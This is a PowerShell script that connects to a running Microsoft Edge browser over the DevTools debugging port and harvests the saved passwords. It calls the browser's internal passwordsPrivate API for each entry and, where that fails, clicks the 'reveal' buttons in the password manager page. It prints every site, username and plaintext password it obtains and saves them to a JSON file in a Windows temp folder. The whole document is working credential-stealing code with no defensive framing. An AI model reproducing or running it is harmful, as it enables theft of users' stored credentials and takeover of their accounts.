$ErrorActionPreference = 'SilentlyContinue'

# ═══ Connect to Edge CDP on original profile ═══
$targets = (curl.exe -s http://127.0.0.1:9222/json/list | ConvertFrom-Json)
$page = $targets | Where-Object { $_.type -eq 'page' } | Select-Object -First 1
if (-not $page) { Write-Output "no page"; exit }

$ws = New-Object System.Net.WebSockets.ClientWebSocket
$ct = [System.Threading.CancellationToken]::None
$ws.ConnectAsync([Uri]$page.webSocketDebuggerUrl, $ct).Wait()

$buf = [byte[]]::new(10485760)
$script:mid = 0

function CdpEval {
    param([string]$js, [int]$waitMs = 0)
    $script:mid++
    $m = @{ id = $script:mid; method = "Runtime.evaluate"; params = @{ expression = $js; awaitPromise = $true; returnByValue = $true } }
    $j = ConvertTo-Json -Compress -InputObject $m -Depth 5
    $b = [System.Text.Encoding]::UTF8.GetBytes($j)
    $s = [ArraySegment[byte]]::new($b)
    $ws.SendAsync($s, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).Wait()
    $s2 = [ArraySegment[byte]]::new($buf)
    $r = $ws.ReceiveAsync($s2, $ct).Result
    if ($waitMs -gt 0) { Start-Sleep -Milliseconds $waitMs }
    return [System.Text.Encoding]::UTF8.GetString($buf, 0, $r.Count)
}

function CdpNav {
    param([string]$url)
    $script:mid++
    $m = @{ id = $script:mid; method = "Page.navigate"; params = @{ url = $url } }
    $j = ConvertTo-Json -Compress -InputObject $m -Depth 5
    $b = [System.Text.Encoding]::UTF8.GetBytes($j)
    $s = [ArraySegment[byte]]::new($b)
    $ws.SendAsync($s, 'Text', $true, $ct).Wait()
    $s2 = [ArraySegment[byte]]::new($buf)
    $r = $ws.ReceiveAsync($s2, $ct).Result
    return [System.Text.Encoding]::UTF8.GetString($buf, 0, $r.Count)
}

# ═══ Navigate to edge://settings/passwords ═══
$nav = CdpNav "edge://settings/passwords"
Write-Output "nav: $($nav.Substring(0, [Math]::Min(150, $nav.Length)))"
Start-Sleep 12

# Enable runtime
$null = CdpEval 'void(0)'

# ═══ Check passwordsPrivate exists ═══
$apiCheck = CdpEval 'typeof chrome !== "undefined" && chrome.passwordsPrivate ? "YES" : JSON.stringify(typeof chrome !== "undefined" ? Object.keys(chrome) : "no chrome")'
$apiObj = $apiCheck | ConvertFrom-Json
$apiVal = $apiObj.result.result.value
Write-Output "passwordsPrivate: $apiVal"

if ($apiVal -ne "YES") {
    # Navigate to edge://password-manager instead
    Write-Output "trying edge://password-manager..."
    $nav2 = CdpNav "edge://password-manager"
    Start-Sleep 12
    $apiCheck2 = CdpEval 'typeof chrome !== "undefined" && chrome.passwordsPrivate ? "YES" : typeof chrome !== "undefined" && chrome.passwordsManagerPrivate ? "PM-YES" : JSON.stringify(typeof chrome !== "undefined" ? Object.keys(chrome) : "none")'
    $apiObj2 = $apiCheck2 | ConvertFrom-Json
    $apiVal = $apiObj2.result.result.value
    Write-Output "second check: $apiVal"
}

# ═══ Get saved password list ═══
Write-Output ""
Write-Output "getting saved password list..."
$listResp = CdpEval 'new Promise(resolve => { try { chrome.passwordsPrivate.getSavedPasswordList(function(list) { resolve(JSON.stringify(list)); }); } catch(e) { resolve(JSON.stringify({error: e.message})); } })'
$listObj = $listResp | ConvertFrom-Json

# Parse nested result
$listStr = $null
try { $listStr = $listObj.result.result.value } catch {}
if (-not $listStr) {
    # Maybe the structure is different
    Write-Output "raw response:"
    Write-Output $listResp.Substring(0, [Math]::Min(1000, $listResp.Length))
}

if ($listStr) {
    $passwords = $listStr | ConvertFrom-Json
    if ($passwords.error) {
        Write-Output "error from API: $($passwords.error)"
    } elseif ($passwords.Count -gt 0) {
        Write-Output "[+] $($passwords.Count) passwords found"
        Write-Output ""

        # ═══ Extract each password ═══
        $allResults = [System.Collections.ArrayList]::new()

        foreach ($entry in $passwords) {
            $eid = $entry.id
            $eurl = if ($entry.urls -and $entry.urls.Count -gt 0) { $entry.urls[0] } elseif ($entry.url) { $entry.url } else { "unknown" }
            $euser = $entry.username

            Write-Output "[*] $eurl ($euser)..."

            # getPlaintextPassword triggers a re-auth prompt in newer versions
            # but in many builds it just returns the password
            $getJs = "new Promise(resolve => { try { chrome.passwordsPrivate.getPlaintextPassword($eid, function(pw) { resolve(pw); }); } catch(e) { resolve('ERR:' + e.message); } })"
            $getResp = CdpEval $getJs
            $getObj = $getResp | ConvertFrom-Json

            $pw = $null
            try { $pw = $getObj.result.result.value } catch {}

            if ($null -ne $pw -and $pw -notlike "ERR:*") {
                [void]$allResults.Add([PSCustomObject]@{
                    url = $eurl; username = $euser; password = $pw
                })
                Write-Output "    PASSWORD: $pw"
            } else {
                # Try with JSON wrapper
                $getJs2 = "new Promise(resolve => { try { chrome.passwordsPrivate.getPlaintextPassword($eid, function(pw) { resolve(JSON.stringify({p:pw})); }); } catch(e) { resolve(JSON.stringify({err:e.message})); } })"
                $getResp2 = CdpEval $getJs2
                $getObj2 = $getResp2 | ConvertFrom-Json
                try {
                    $val = $getObj2.result.result.value
                    if ($val) {
                        $parsed = $val | ConvertFrom-Json
                        if ($parsed.p) {
                            [void]$allResults.Add([PSCustomObject]@{ url=$eurl; username=$euser; password=$parsed.p })
                            Write-Output "    PASSWORD: $($parsed.p)"
                        } elseif ($parsed.err) {
                            Write-Output "    error: $($parsed.err)"
                        }
                    }
                } catch {
                    Write-Output "    parse error: $val"
                }
            }
        }

        # ═══ Output results ═══
        Write-Output ""
        Write-Output "================================================================"
        Write-Output "              DECRYPTED PASSWORDS (via chrome.passwordsPrivate)"
        Write-Output "================================================================"
        foreach ($r in $allResults) {
            Write-Output ""
            Write-Output "  Site:     $($r.url)"
            Write-Output "  Username: $($r.username)"
            Write-Output "  Password: $($r.password)"
            Write-Output "  ────────────────────────────────────────────────"
        }

        # Save
        $allResults | ConvertTo-Json -Depth 3 | Out-File "C:\Windows\Temp\ziti\passwords_plaintext.json" -Encoding utf8
        Write-Output ""
        Write-Output "[+] saved to C:\Windows\Temp\ziti\passwords_plaintext.json"

    } else {
        Write-Output "password list is empty (0 items)"
        Write-Output "list content: $listStr"
    }
} else {
    # passwordsPrivate not available — try the password-manager UI DOM approach
    Write-Output ""
    Write-Output "passwordsPrivate not available, trying DOM approach..."
    Start-Sleep 5

    # Wait for page to render, then search shadow DOM for password rows
    $domCheck = CdpEval @'
(function() {
    // Edge password manager uses Lit elements with shadow DOM
    // Find all custom elements that might contain passwords
    let hosts = [];
    function findHosts(root, depth) {
        if (depth > 8) return;
        try {
            let els = root.querySelectorAll('*');
            for (let el of els) {
                if (el.shadowRoot) {
                    hosts.push(el);
                    findHosts(el.shadowRoot, depth + 1);
                }
            }
        } catch(e) {}
    }
    findHosts(document, 0);
    return JSON.stringify({
        totalHosts: hosts.length,
        tags: hosts.map(h => h.tagName).slice(0, 30)
    });
})()
'@
    $domObj = $domCheck | ConvertFrom-Json
    Write-Output "shadow DOM: $($domObj.result.result.value)"

    # Try to find password entries in shadow DOM and click reveal buttons
    $domExtract = CdpEval @'
(function() {
    let results = [];
    function searchShadow(root, depth) {
        if (depth > 8) return;
        try {
            let els = root.querySelectorAll('*');
            for (let el of els) {
                // Look for password text elements
                let text = el.textContent || '';
                if (el.type === 'password' || (el.classList && el.classList.contains('password'))) {
                    results.push({tag: el.tagName, type: el.type, value: el.value || ''});
                }
                // Look for show/reveal buttons and click them
                if (el.getAttribute && (el.getAttribute('aria-label') || '').match(/show|reveal|비밀번호 표시/i)) {
                    el.click();
                    results.push({clicked: el.tagName, label: el.getAttribute('aria-label')});
                }
                if (el.shadowRoot) searchShadow(el.shadowRoot, depth + 1);
            }
        } catch(e) {}
    }
    searchShadow(document, 0);
    return JSON.stringify(results);
})()
'@
    $extObj = $domExtract | ConvertFrom-Json
    Write-Output "extraction: $($extObj.result.result.value)"

    # Wait for passwords to be revealed, then read them
    Start-Sleep 3
    $domRead = CdpEval @'
(function() {
    let results = [];
    function readPasswords(root, depth) {
        if (depth > 8) return;
        try {
            let els = root.querySelectorAll('*');
            for (let el of els) {
                // After clicking reveal, passwords appear in specific elements
                if (el.classList && (el.classList.contains('password-value') || el.classList.contains('password-text'))) {
                    results.push({class: el.className, text: el.textContent.trim()});
                }
                // Look for any element showing a password-like value
                let text = (el.value || el.textContent || '').trim();
                if (text.length > 4 && !text.includes(' ') && /^[a-zA-Z0-9!@#$%^&*()_+=-]+$/.test(text)) {
                    let parent = el.closest('[data-url], [data-origin], password-row, cr-password-list-item');
                    if (parent) {
                        results.push({parent: parent.tagName, value: text});
                    }
                }
                if (el.shadowRoot) readPasswords(el.shadowRoot, depth + 1);
            }
        } catch(e) {}
    }
    readPasswords(document, 0);
    return JSON.stringify(results);
})()
'@
    $readObj = $domRead | ConvertFrom-Json
    Write-Output "revealed: $($readObj.result.result.value)"

    # Save whatever we found
    $readObj.result.result.value | Out-File "C:\Windows\Temp\ziti\dom_passwords.json" -Encoding utf8
}

$ws.Dispose()
Write-Output "[+] done"